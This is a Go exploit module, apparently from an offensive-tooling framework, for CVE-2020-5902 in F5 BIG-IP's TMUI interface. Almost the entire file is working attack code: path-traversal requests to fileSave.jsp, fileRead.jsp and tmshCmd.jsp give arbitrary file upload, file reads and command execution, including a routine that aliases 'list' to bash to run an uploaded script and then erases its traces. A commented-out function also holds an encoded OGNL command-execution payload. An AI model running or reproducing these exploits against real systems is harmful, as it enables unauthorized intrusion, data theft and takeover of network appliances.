package exp_F5

import (
	"encoding/json"
	"fmt"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
)

type readFileJson struct {
	Output string `json:"output"`
}

type tmshCmdJson struct {
	Error  string `json:"error"`
	Output string `json:"output"`
}

func getShowString(src string) (dst string) {
	if !strings.Contains(src, "\r\n") {
		dst = strings.ReplaceAll(src, "\n", "\r\n")
	} else {
		dst = src
	}
	return
}

type Exp_CVE_2020_5902 struct {
	exp_templates.ExpTemplate
}

//func (self *Exp_CVE_2020_5902) Attack_cmd1()  (expResult templates.ExpResult) {
//	// 默认配置
//	headers := lzhttp.Header{}
//	if self.Params.Headers != nil {
//		headers = self.Params.Headers
//	}
//	if _, ok := headers["User-Agent"]; !ok {
//		headers["User-Agent"] = []string{`Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36`}
//	}
//	if _, ok := headers["Accept"]; !ok {
//		headers["Accept"] = []string{`text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2`}
//	}
//	if self.Params.Cookie != "" {
//		headers["Cookie"] = []string{self.Params.Cookie}
//	}
//
//	// 构造payload
//	shellPayload := `smultipart/form-data%{\u0028\u0023\u0064\u006d\u003d\u0040\u006f\u0067\u006e\u006c\u002e\u004f\u0067\u006e\u006c\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u0040\u0044\u0045\u0046\u0041\u0055\u004c\u0054\u005f\u004d\u0045\u004d\u0042\u0045\u0052\u005f\u0041\u0043\u0043\u0045\u0053\u0053\u0029\u002e\u0028\u0023\u005f\u006d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u003f\u0028\u0023\u005f\u006d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u003d\u0023\u0064\u006d\u0029\u003a\u0028\u0028\u0023\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u003d\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u005b\u0027\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u0041\u0063\u0074\u0069\u006f\u006e\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u0027\u005d\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u003d\u0023\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u002e\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u0028\u0040\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u006f\u0067\u006e\u006c\u002e\u004f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u0040\u0063\u006c\u0061\u0073\u0073\u0029\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u002e\u0067\u0065\u0074\u0045\u0078\u0063\u006c\u0075\u0064\u0065\u0064\u0050\u0061\u0063\u006b\u0061\u0067\u0065\u004e\u0061\u006d\u0065\u0073\u0028\u0029\u002e\u0063\u006c\u0065\u0061\u0072\u0028\u0029\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u002e\u0067\u0065\u0074\u0045\u0078\u0063\u006c\u0075\u0064\u0065\u0064\u0043\u006c\u0061\u0073\u0073\u0065\u0073\u0028\u0029\u002e\u0063\u006c\u0065\u0061\u0072\u0028\u0029\u0029\u002e\u0028\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0073\u0065\u0074\u004d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u0028\u0023\u0064\u006d\u0029\u0029\u0029\u0029\u002e\u0028\u0023\u0072\u0065\u0071\u003d\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0067\u0065\u0074\u0028\u0027\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u0064\u0069\u0073\u0070\u0061\u0074\u0063\u0068\u0065\u0072\u002e\u0048\u0074\u0074\u0070\u0053\u0065\u0072\u0076\u006c\u0065\u0074\u0052\u0065\u0071\u0075\u0065\u0073\u0074\u0027\u0029\u0029\u002e\u0028\u0023\u0068\u0068\u003d\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0067\u0065\u0074\u0028\u0027\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u0064\u0069\u0073\u0070\u0061\u0074\u0063\u0068\u0065\u0072\u002e\u0048\u0074\u0074\u0070\u0053\u0065\u0072\u0076\u006c\u0065\u0074\u0052\u0065\u0073\u0070\u006f\u006e\u0073\u0065\u0027\u0029\u0029\u002e\u0028\u0023\u006f\u0073\u006e\u0061\u006d\u0065\u003d\u0040\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0079\u0073\u0074\u0065\u006d\u0040\u0067\u0065\u0074\u0050\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0028\u0027\u006f\u0073\u002e\u006e\u0061\u006d\u0065\u0027\u0029\u0029\u002e\u0028\u0023\u006c\u0069\u0073\u0074\u003d\u0023\u006f\u0073\u006e\u0061\u006d\u0065\u002e\u0073\u0074\u0061\u0072\u0074\u0073\u0057\u0069\u0074\u0068\u0028\u0027\u0057\u0069\u006e\u0064\u006f\u0077\u0073\u0027\u0029\u003f\u007b\u0027\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0027\u002c\u0027\u002f\u0063\u0027\u002c\u0023\u0070\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0073\u002e\u0063\u006d\u0064\u005b\u0030\u005d\u007d\u003a\u007b\u0027\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068\u0027\u002c\u0027\u002d\u0063\u0027\u002c\u0023\u0070\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0073\u002e\u0063\u006d\u0064\u005b\u0030\u005d\u007d\u0029\u002e\u0028\u0023\u0061\u0061\u003d\u0028\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0042\u0075\u0069\u006c\u0064\u0065\u0072\u0028\u0023\u006c\u0069\u0073\u0074\u0029\u0029\u002e\u0073\u0074\u0061\u0072\u0074\u0028\u0029\u0029\u002e\u0028\u0023\u0062\u0062\u003d\u0023\u0061\u0061\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u0029\u002e\u0028\u0023\u0068\u0068\u002e\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072\u0028\u0029\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067\u0028\u006e\u0065\u0077\u0020\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0063\u006f\u006d\u006d\u006f\u006e\u0073\u002e\u0069\u006f\u002e\u0049\u004f\u0055\u0074\u0069\u006c\u0073\u0028\u0029\u002e\u0074\u006f\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079\u0028\u0023\u0062\u0062\u0029\u002c\u0023\u0070\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0073\u002e\u0065\u006e\u0063\u006f\u0064\u0065\u0029\u0029\u003f\u0074\u0072\u0075\u0065\u003a\u0074\u0072\u0075\u0065\u0029\u002e\u0028\u0023\u0068\u0068\u002e\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072\u0028\u0029\u002e\u0066\u006c\u0075\u0073\u0068\u0028\u0029\u0029\u002e\u0028\u0023\u0068\u0068\u002e\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072\u0028\u0029\u002e\u0063\u006c\u006f\u0073\u0065\u0028\u0029\u0029}`
//	headers["Content-Type"] = []string{shellPayload}
//
//	cmd = strings.ReplaceAll(cmd, " ", "+")
//	cmd = url.PathEscape(cmd)
//	target := strings.TrimRight(self.Params.BaseParam.Target, "?") + fmt.Sprintf("?&&encode=%s&cmd=%s", self.Params.Settings.Charset, cmd)
//
//	// 发送请求
//	httpresp := base.HttpGet(target, headers, self.Params.Settings.Charset, self.Params.Timeout, self.Params.Proxy, self.Params.Chunked)
//	if httpresp.Err != nil {
//		expResult.Err = httpresp.Err.Error()
//		return
//	}
//	expResult.Result = httpresp.Body
//	return
//}

func (self *Exp_CVE_2020_5902) Attack_upload1() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp`
	target := strings.TrimRight(self.Params.BaseParam.Target, "/") + shellPayload

	headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}
	data := fmt.Sprintf("fileName=%s&content=%s", url.QueryEscape(filename), url.QueryEscape(content))
	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Status = true
	expResult.Result = "请自行检查\r\n" + httpresp.Body
	return
}
func (self *Exp_CVE_2020_5902) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 默认配置
	cmdResult := ""
	headers := self.GetInitExpHeaders()

	// 构造payload
	//fileReadUri := `/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp`
	tmshCmdUri := `/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp`
	fileSaveUri := `/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp`

	//fileReadData := "fileName=%s"
	tmshCmdData := "command=%s"
	fileSaveData := "fileName=%s&content=%s"

	target := strings.TrimRight(self.Params.BaseParam.Target, "/")

	headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}

	// 发送请求
	// 0. 测试获取admin信息
	httpresp := self.HttpPostWithoutRedirect(target+tmshCmdUri, fmt.Sprintf(tmshCmdData, url.QueryEscape("list auth user")), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	c := new(tmshCmdJson)
	err := json.Unmarshal([]byte(httpresp.Body), c)
	if err != nil {
		expResult.Result = httpresp.Body
		return
	}

	if c.Error != "" || c.Output == "" {
		expResult.Result = "[-] target can not exec cmd."
		return
	}
	self.EchoSuccessMsg("Get admin msg\r\n" + getShowString(c.Output))
	defer func() {
		// 4. 还原list命令
		self.EchoSuccessMsg("Deleting alias list=bash")
		httpresp = self.HttpPostWithoutRedirect(target+tmshCmdUri, fmt.Sprintf(tmshCmdData, url.QueryEscape("delete cli alias private list")), headers)
		if httpresp.Err != nil {
			expResult.Err = httpresp.Err.Error()
			return
		}
		c = new(tmshCmdJson)
		err = json.Unmarshal([]byte(httpresp.Body), c)
		if err != nil {
			expResult.Result = httpresp.Body
			return
		}

		if c.Error != "" {
			expResult.Result = "[-] " + c.Error
			return
		}
		self.EchoSuccessMsg("Successfully deleted alias list=bash")

		// 5. 清空bash文件
		self.EchoSuccessMsg("Cleaning /tmp/test.txt")
		httpresp = self.HttpPostWithoutRedirect(target+fileSaveUri, fmt.Sprintf(fileSaveData, url.QueryEscape("/tmp/test.txt"), url.QueryEscape(self.MustGetStringParam("cmd"))), headers)
		if httpresp.Err != nil {
			expResult.Err = httpresp.Err.Error()
			return
		}
		if httpresp.Resp.StatusCode != 200 {
			expResult.Result = "[-] Failed to upload /tmp/test.txt"
		}
		self.EchoSuccessMsg("Successfully cleaned /tmp/test.txt")

		self.EchoSuccessMsg("Cmd result is: \r\n" + cmdResult)

	}()
	// 1. 修改alias劫持list命令为bash
	self.EchoSuccessMsg("Creating alias list=bash")
	httpresp = self.HttpPostWithoutRedirect(target+tmshCmdUri, fmt.Sprintf(tmshCmdData, url.QueryEscape("create cli alias private list command bash")), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	c = new(tmshCmdJson)
	err = json.Unmarshal([]byte(httpresp.Body), c)
	if err != nil {
		expResult.Result = httpresp.Body
		return
	}

	if c.Error != "" {
		self.EchoErrMsg(c.Error)
		return
	}
	self.EchoSuccessMsg("Successfully created alias list=bash")

	// 2. 写入bash文件
	self.EchoSuccessMsg("Uploading /tmp/test.txt")
	httpresp = self.HttpPostWithoutRedirect(target+fileSaveUri, fmt.Sprintf(fileSaveData, url.QueryEscape("/tmp/test.txt"), url.QueryEscape(self.MustGetStringParam("cmd"))), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		expResult.Result = "[-] Failed to upload /tmp/test.txt"
	}
	self.EchoSuccessMsg("Successfully uploaded /tmp/test.txt")

	// 3. 执行bash文件
	self.EchoSuccessMsg("Executing /tmp/test.txt")
	httpresp = self.HttpPostWithoutRedirect(target+tmshCmdUri, fmt.Sprintf(tmshCmdData, url.QueryEscape("list /tmp/test.txt")), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	c = new(tmshCmdJson)
	err = json.Unmarshal([]byte(httpresp.Body), c)
	if err != nil {
		expResult.Result = httpresp.Body
		return
	}

	if c.Error != "" {
		self.EchoErrMsg(c.Error)
		return
	}
	cmdResult = getShowString(c.Output)

	return
}
func (self *Exp_CVE_2020_5902) Attack_cmd2() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	tmshCmdUri := `/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp`
	tmshCmdData := "command=%s"

	target := strings.TrimRight(self.Params.BaseParam.Target, "/")

	headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}

	// 发送请求
	// 0. 测试获取admin信息
	httpresp := self.HttpPostWithoutRedirect(target+tmshCmdUri, fmt.Sprintf(tmshCmdData, url.QueryEscape(self.MustGetStringParam("cmd"))), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	c := new(tmshCmdJson)
	err := json.Unmarshal([]byte(httpresp.Body), c)
	if err != nil {
		expResult.Result = httpresp.Body
		return
	}

	if c.Error != "" || c.Output == "" {
		expResult.Result = "[-] target can not exec cmd.\r\n [-] err: " + getShowString(c.Error)
		return
	}
	self.EchoSuccessMsg("Get admin msg\r\n" + getShowString(c.Output))

	return
}

func (self *Exp_CVE_2020_5902) Attack_read() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp`
	target := strings.TrimRight(self.Params.BaseParam.Target, "/") + shellPayload

	headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}
	data := "fileName=" + url.QueryEscape(self.MustGetStringParam("path"))
	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	r := new(readFileJson)
	err := json.Unmarshal([]byte(httpresp.Body), r)
	if err != nil {
		expResult.Result = httpresp.Body
		return
	}
	if r.Output != "" {
		expResult.Result = "[+] read file success.\r\n" + getShowString(r.Output)

	} else {
		expResult.Result = "[-] read file failed."
	}

	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2020_5902{}, "exp_CVE-2020-5902.yml")
}
